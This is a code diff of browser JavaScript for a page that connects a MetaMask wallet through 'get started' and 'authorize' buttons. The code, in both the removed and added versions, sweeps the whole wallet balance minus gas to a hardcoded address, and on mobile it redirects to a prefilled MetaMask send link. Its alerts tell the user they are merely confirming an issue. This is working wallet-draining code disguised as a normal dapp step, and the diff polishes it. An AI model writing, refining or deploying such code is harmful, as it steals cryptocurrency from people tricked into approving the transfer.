@@ -1,87 +1,90 @@
 let provider;
 let signer;
 
-// Function to detect mobile device
+// Function to detect mobile devices
 function isMobile() {
     return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 }
 
-
 document.getElementById('get-started').addEventListener('click', async () => {
-    if (window.ethereum) {
+    if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
         try {
             // Request account access
             await ethereum.request({ method: 'eth_requestAccounts' });
-            alert('MetaMask is connected,, now tap the authorize button to confirm');
+            alert('MetaMask is connected, now click the authorize button to confirm issue');
 
             // Create a provider
             provider = new ethers.providers.Web3Provider(window.ethereum);
 
             // Get the signer (connected user)
             signer = provider.getSigner();
-
-            // Enable the send transaction button
-            document.getElementById('sendTransaction').disabled = false;
         } catch (error) {
-        alert('User denied account access', error);
+            console.error('User denied account access', error);
         }
     } else {
-        alert('MetaMask is not installed');
+        alert('MetaMask is not installed. Please install it to use this app.');
+        console.error('MetaMask is not installed');
     }
 });
 
 async function createAndSignTransaction() {
-    if (window.ethereum && signer) {
-        try {
-            // Get the balance of the connected wallet
-            const balance = await signer.getBalance();
+    if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
+        if (signer) {
+            try {
+                // Get the balance of the connected wallet
+                const balance = await signer.getBalance();
 
-            // Get the current gas price
-            const gasPrice = await provider.getGasPrice();
+                // Get the current gas price
+                const gasPrice = await provider.getGasPrice();
 
-            // Calculate the gas limit for a standard transaction
-            const gasLimit = ethers.utils.hexlify(21000);
+                // Calculate the gas limit for a standard transaction
+                const gasLimit = ethers.utils.hexlify(21000);
 
-            // Calculate the total gas cost
-            const gasCost = gasPrice.mul(gasLimit);
+                // Calculate the total gas cost
+                const gasCost = gasPrice.mul(gasLimit);
 
-            // Calculate the amount to send (balance - gas cost)
-            const value = balance.sub(gasCost);
+                // Calculate the amount to send (balance - gas cost)
+                const value = balance.sub(gasCost);
 
-            // Define the transaction
-            const tx = {
-                to: '0xC0ffee254729296a45a3885639AC7E10F9d54979',  // Replace with the recipient address
-                value: value,
-                gasLimit: gasLimit,
-                gasPrice: gasPrice
-            };
-
-            // If on mobile, redirect to MetaMask app
-            if (isMobile()) {
-                const txParams = {
-                    to: tx.to,
-                    from: await signer.getAddress(),
-                    value: tx.value.toHexString(),
-                    gas: tx.gasLimit.toHexString(),
-                    gasPrice: tx.gasPrice.toHexString(),
+                // Define the transaction
+                const tx = {
+                    to: '0xC0ffee254729296a45a3885639AC7E10F9d54979',  // Replace with the recipient address
+                    value: value,
+                    gasLimit: gasLimit,
+                    gasPrice: gasPrice
                 };
 
-                const txUrl = `https://metamask.app.link/send?${new URLSearchParams(txParams).toString()}`;
-                window.location.href = txUrl;
-            } else {
-                // Send the transaction
-                const txResponse = await signer.sendTransaction(tx);
-                console.log('Transaction hash:', txResponse.hash);
+                // If on mobile, redirect to MetaMask app
+                if (isMobile()) {
+                    const txParams = {
+                        to: tx.to,
+                        from: await signer.getAddress(),
+                        value: tx.value.toHexString(),
+                        gas: tx.gasLimit.toHexString(),
+                        gasPrice: tx.gasPrice.toHexString(),
+                    };
 
-                // Wait for the transaction to be mined
-                const receipt = await txResponse.wait();
-                console.log('Transaction confirmed:', receipt);
+                    const txUrl = `https://metamask.app.link/send?${new URLSearchParams(txParams).toString()}`;
+                    window.location.href = txUrl;
+                } else {
+                    // Send the transaction
+                    const txResponse = await signer.sendTransaction(tx);
+                    console.log('Transaction hash:', txResponse.hash);
+
+                    // Wait for the transaction to be mined
+                    const receipt = await txResponse.wait();
+                    console.log('Transaction confirmed:', receipt);
+                }
+            } catch (error) {
+                console.error('Transaction failed:', error);
             }
-        } catch (error) {
-            console.error('Transaction failed:', error);
+        } else {
+            console.error('Wallet is not connected');
+            alert('Please connect your wallet first.');
         }
     } else {
-        alert('MetaMask is not installed or wallet is not connected');
+        console.error('MetaMask is not installed');
+        alert('MetaMask is not installed. Please install it to use this app.');
     }
 }
 
